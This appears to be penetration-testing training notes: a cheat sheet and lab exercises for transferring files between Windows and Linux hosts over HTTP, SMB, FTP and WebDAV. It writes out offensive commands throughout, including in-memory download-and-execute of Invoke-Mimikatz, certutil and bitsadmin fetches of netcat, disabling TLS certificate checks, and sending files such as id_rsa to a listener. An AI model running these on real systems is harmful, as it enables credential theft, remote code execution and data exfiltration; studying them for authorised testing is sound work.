## File Transfer Cheat Sheet

| Command | Description |
|--------|-------------|
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')` | Execute a file in memory using PowerShell |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64` | Upload a file with PowerShell |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe` | Download a file using Bitsadmin |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` | Download a file using Certutil |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Download a file using Wget |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Download a file using cURL |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'` | Download a file using PHP |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User-Agent |


## Windows File Transfer Methods

### Summary
Windows file transfers can be performed using native tooling (PowerShell, SMB, FTP, WebDAV) for both download and upload; operators often verify integrity with hashes (e.g., MD5) to confirm successful transfer.

------------------------------------------------------------

## EXERCISE: PowerShell Base64 Transfer (No Network Required)

### Task 1: On Linux (Pwnbox) compute MD5 and Base64-encode a file

1. Run: `md5sum id_rsa`
   - Target-agnostic: `md5sum <LOCAL_FILE>`
   - Example result:
     - `<MD5_HASH>  <LOCAL_FILE>`

2. Run: `cat id_rsa |base64 -w 0;echo`
   - Target-agnostic: `cat <LOCAL_FILE> | base64 -w 0; echo`
   - Example result:
     - `<BASE64_BLOB>`

------------------------------------------------------------

### Task 2: On Windows decode Base64 into a file

1. Run: `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<BASE64_BLOB>"))`
   - Target-agnostic: `[IO.File]::WriteAllBytes("<OUT_FILE_PATH>", [Convert]::FromBase64String("<BASE64_BLOB>"))`
   - Example result:
     - `(no output; file written to disk)`

2. Run: `Get-FileHash C:\Users\Public\id_rsa -Algorithm md5`
   - Target-agnostic: `Get-FileHash <OUT_FILE_PATH> -Algorithm md5`
   - Example result:
     - `MD5  <MD5_HASH>  <OUT_FILE_PATH>`

------------------------------------------------------------

## EXERCISE: PowerShell Web Downloads (HTTP/HTTPS/FTP)

### Task 1: Download a file to disk (WebClient DownloadFile)

1. Run: `(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')`
   - Target-agnostic: `(New-Object Net.WebClient).DownloadFile('<URL>','<OUT_FILE_PATH>')`
   - Example result:
     - `(no output; file saved to <OUT_FILE_PATH>)`

2. Run: `(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')`
   - Target-agnostic: `(New-Object Net.WebClient).DownloadFileAsync('<URL>','<OUT_FILE_PATH>')`
   - Example result:
     - `(no output; async download started)`

------------------------------------------------------------

### Task 2: Fileless execution (WebClient DownloadString + IEX)

1. Run: `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')`
   - Target-agnostic: `IEX (New-Object Net.WebClient).DownloadString('<URL>')`
   - Example result:
     - `(script executes in memory; output varies by script)`

2. Run: `(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX`
   - Target-agnostic: `(New-Object Net.WebClient).DownloadString('<URL>') | IEX`
   - Example result:
     - `(script executes in memory; output varies by script)`

------------------------------------------------------------

### Task 3: Download using Invoke-WebRequest (iwr/curl/wget aliases)

1. Run: `Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1`
   - Target-agnostic: `Invoke-WebRequest <URL> -OutFile <OUT_FILE_NAME>`
   - Example result:
     - `(no output; file saved as <OUT_FILE_NAME>)`

------------------------------------------------------------

### Task 4: Common PowerShell download fixes

1. Run: `Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX`
   - Target-agnostic: `Invoke-WebRequest <URL> -UseBasicParsing | IEX`
   - Example result:
     - `(bypasses IE first-launch parsing issue; script executes)`

2. Run: `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`
   - Target-agnostic: `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`
   - Example result:
     - `(no output; SSL validation bypass set for session)`

------------------------------------------------------------

## EXERCISE: SMB Downloads (Impacket SMB Server)

### Task 1: On Linux (Pwnbox) start an SMB server (anonymous)

1. Run: `sudo impacket-smbserver share -smb2support /tmp/smbshare`
   - Target-agnostic: `sudo impacket-smbserver <SHARE_NAME> -smb2support <SHARE_DIR>`
   - Example result:
     - `Impacket v<VER> ...`
     - `[*] Config file parsed`

------------------------------------------------------------

### Task 2: On Windows download from SMB share (unauthenticated)

1. Run: `copy \\192.168.220.133\share\nc.exe`
   - Target-agnostic: `copy \\<SMB_SERVER_IP>\<SHARE_NAME>\<FILENAME>`
   - Example result:
     - `1 file(s) copied.`

------------------------------------------------------------

### Task 3: Start SMB server with credentials (to bypass guest-block)

1. Run: `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`
   - Target-agnostic: `sudo impacket-smbserver <SHARE_NAME> -smb2support <SHARE_DIR> -user <USER> -password <PASS>`
   - Example result:
     - `Impacket v<VER> ...`
     - `[*] Config file parsed`

2. Run: `net use n: \\192.168.220.133\share /user:test test`
   - Target-agnostic: `net use <DRIVE_LETTER>: \\<SMB_SERVER_IP>\<SHARE_NAME> /user:<USER> <PASS>`
   - Example result:
     - `The command completed successfully.`

3. Run: `copy n:\nc.exe`
   - Target-agnostic: `copy <DRIVE_LETTER>:\<FILENAME>`
   - Example result:
     - `1 file(s) copied.`

------------------------------------------------------------

## EXERCISE: FTP Downloads (pyftpdlib)

### Task 1: On Linux install and start FTP server

1. Run: `sudo pip3 install pyftpdlib`
   - Target-agnostic: `sudo pip3 install pyftpdlib`
   - Example result:
     - `Successfully installed pyftpdlib-<VERSION>`

2. Run: `sudo python3 -m pyftpdlib --port 21`
   - Target-agnostic: `sudo python3 -m pyftpdlib --port <PORT>`
   - Example result:
     - `>>> starting FTP server on 0.0.0.0:21, pid=<PID> <<<`

------------------------------------------------------------

### Task 2: On Windows download via PowerShell WebClient (FTP)

1. Run: `(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')`
   - Target-agnostic: `(New-Object Net.WebClient).DownloadFile('ftp://<FTP_IP>/<REMOTE_FILE>', '<OUT_FILE_PATH>')`
   - Example result:
     - `(no output; file saved to <OUT_FILE_PATH>)`

------------------------------------------------------------

### Task 3: On Windows download via FTP client using a command file (non-interactive)

1. Run: `echo open 192.168.49.128 > ftpcommand.txt`
   - Target-agnostic: `echo open <FTP_IP> > ftpcommand.txt`
   - Example result:
     - `(no output; file created)`

2. Run: `echo USER anonymous >> ftpcommand.txt`
   - Target-agnostic: `echo USER <USER> >> ftpcommand.txt`
   - Example result:
     - `(no output)`

3. Run: `echo binary >> ftpcommand.txt`
   - Target-agnostic: `echo binary >> ftpcommand.txt`
   - Example result:
     - `(no output)`

4. Run: `echo GET file.txt >> ftpcommand.txt`
   - Target-agnostic: `echo GET <REMOTE_FILE> >> ftpcommand.txt`
   - Example result:
     - `(no output)`

5. Run: `echo bye >> ftpcommand.txt`
   - Target-agnostic: `echo bye >> ftpcommand.txt`
   - Example result:
     - `(no output)`

6. Run: `ftp -v -n -s:ftpcommand.txt`
   - Target-agnostic: `ftp -v -n -s:<FTP_SCRIPT_FILE>`
   - Example result:
     - `ftp> open <FTP_IP>`
     - `ftp> USER <USER>`
     - `ftp> GET <REMOTE_FILE>`
     - `ftp> bye`

7. Run: `more file.txt`
   - Target-agnostic: `more <DOWNLOADED_FILE>`
   - Example result:
     - `<FILE_CONTENTS>`

------------------------------------------------------------

## EXERCISE: Upload Operations (Base64)

### Task 1: On Windows Base64-encode a file + hash it

1. Run: `[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))`
   - Target-agnostic: `[Convert]::ToBase64String((Get-Content -path "<FILE_PATH>" -Encoding byte))`
   - Example result:
     - `<BASE64_BLOB>`

2. Run: `Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash`
   - Target-agnostic: `Get-FileHash "<FILE_PATH>" -Algorithm MD5 | select Hash`
   - Example result:
     - `Hash`
     - `<MD5_HASH>`

------------------------------------------------------------

### Task 2: On Linux decode Base64 into a file + verify

1. Run: `echo <base64> | base64 -d -w 0 > hosts`
   - Target-agnostic: `echo <BASE64_BLOB> | base64 -d -w 0 > <OUT_FILE>`
   - Example result:
     - `(no output; file written)`

2. Run: `md5sum hosts`
   - Target-agnostic: `md5sum <OUT_FILE>`
   - Example result:
     - `<MD5_HASH>  <OUT_FILE>`

------------------------------------------------------------

## EXERCISE: PowerShell Web Uploads (Python uploadserver + PSUpload)

### Task 1: On Linux install and start uploadserver

1. Run: `pip3 install uploadserver`
   - Target-agnostic: `pip3 install uploadserver`
   - Example result:
     - `Successfully installed uploadserver-<VERSION>`

2. Run: `python3 -m uploadserver`
   - Target-agnostic: `python3 -m uploadserver`
   - Example result:
     - `File upload available at /upload`
     - `Serving HTTP on 0.0.0.0 port 8000 ...`

------------------------------------------------------------

### Task 2: On Windows load PSUpload.ps1 and upload a file

1. Run: `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')`
   - Target-agnostic: `IEX(New-Object Net.WebClient).DownloadString('<PSUPLOAD_URL>')`
   - Example result:
     - `(no output; function loaded into session)`

2. Run: `Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts`
   - Target-agnostic: `Invoke-FileUpload -Uri http://<UPLOAD_SERVER_IP>:<PORT>/upload -File <FILE_PATH>`
   - Example result:
     - `[+] File Uploaded:  <FILE_PATH>`
     - `[+] FileHash:  <HASH>`

------------------------------------------------------------

## EXERCISE: Base64 Web Upload (POST + netcat capture)

### Task 1: On Windows POST base64 data to a listener

1. Run: `$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))`
   - Target-agnostic: `$b64 = [System.convert]::ToBase64String((Get-Content -Path '<FILE_PATH>' -Encoding Byte))`
   - Example result:
     - `(variable set; no output)`

2. Run: `Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64`
   - Target-agnostic: `Invoke-WebRequest -Uri http://<LISTENER_IP>:<PORT>/ -Method POST -Body $b64`
   - Example result:
     - `(request sent; server/listener receives base64 body)`

------------------------------------------------------------

### Task 2: On Linux receive POST body and decode

1. Run: `nc -lvnp 8000`
   - Target-agnostic: `nc -lvnp <PORT>`
   - Example result:
     - `listening on [any] <PORT> ...`
     - `POST / HTTP/1.1`
     - `<BASE64_BLOB>`

2. Run: `echo <base64> | base64 -d -w 0 > hosts`
   - Target-agnostic: `echo <BASE64_BLOB> | base64 -d -w 0 > <OUT_FILE>`
   - Example result:
     - `(no output; file written)`

------------------------------------------------------------

## EXERCISE: SMB Uploads over WebDAV (wsgidav)

### Task 1: On Linux install and start WebDAV server

1. Run: `sudo pip3 install wsgidav cheroot`
   - Target-agnostic: `sudo pip3 install wsgidav cheroot`
   - Example result:
     - `Successfully installed WsgiDAV-<VERSION> ...`

2. Run: `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`
   - Target-agnostic: `sudo wsgidav --host=<BIND_IP> --port=<PORT> --root=<SHARE_DIR> --auth=anonymous`
   - Example result:
     - `WsgiDAV/<VERSION> Python/<VERSION>`
     - `Serving on http://0.0.0.0:80 ...`

------------------------------------------------------------

### Task 2: On Windows browse WebDAV share and upload

1. Run: `dir \\192.168.49.128\DavWWWRoot`
   - Target-agnostic: `dir \\<WEBDAV_IP>\DavWWWRoot`
   - Example result:
     - `Directory of \\<WEBDAV_IP>\DavWWWRoot`
     - `<DIR> sharefolder`
     - `<FILE> filetest.txt`

2. Run: `copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\`
   - Target-agnostic: `copy <LOCAL_FILE_PATH> \\<WEBDAV_IP>\DavWWWRoot\`
   - Example result:
     - `1 file(s) copied.`

3. Run: `copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\`
   - Target-agnostic: `copy <LOCAL_FILE_PATH> \\<WEBDAV_IP>\<SHAREFOLDER>\`
   - Example result:
     - `1 file(s) copied.`

------------------------------------------------------------

## EXERCISE: FTP Uploads (pyftpdlib --write)

### Task 1: On Linux start FTP server with upload enabled

1. Run: `sudo python3 -m pyftpdlib --port 21 --write`
   - Target-agnostic: `sudo python3 -m pyftpdlib --port <PORT> --write`
   - Example result:
     - `>>> starting FTP server on 0.0.0.0:21, pid=<PID> <<<`

------------------------------------------------------------

### Task 2: On Windows upload via PowerShell WebClient (FTP)

1. Run: `(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`
   - Target-agnostic: `(New-Object Net.WebClient).UploadFile('ftp://<FTP_IP>/<REMOTE_NAME>', '<LOCAL_FILE_PATH>')`
   - Example result:
     - `(no output; file uploaded to FTP server)`

------------------------------------------------------------

### Task 3: On Windows upload via FTP client using a command file

1. Run: `echo open 192.168.49.128 > ftpcommand.txt`
   - Target-agnostic: `echo open <FTP_IP> > ftpcommand.txt`
   - Example result:
     - `(no output)`

2. Run: `echo USER anonymous >> ftpcommand.txt`
   - Target-agnostic: `echo USER <USER> >> ftpcommand.txt`
   - Example result:
     - `(no output)`

3. Run: `echo binary >> ftpcommand.txt`
   - Target-agnostic: `echo binary >> ftpcommand.txt`
   - Example result:
     - `(no output)`

4. Run: `echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt`
   - Target-agnostic: `echo PUT <LOCAL_FILE_PATH> >> ftpcommand.txt`
   - Example result:
     - `(no output)`

5. Run: `echo bye >> ftpcommand.txt`
   - Target-agnostic: `echo bye >> ftpcommand.txt`
   - Example result:
     - `(no output)`

6. Run: `ftp -v -n -s:ftpcommand.txt`
   - Target-agnostic: `ftp -v -n -s:<FTP_SCRIPT_FILE>`
   - Example result:
     - `ftp> open <FTP_IP>`
     - `ftp> USER <USER>`
     - `ftp> PUT <LOCAL_FILE_PATH>`
     - `ftp> bye`

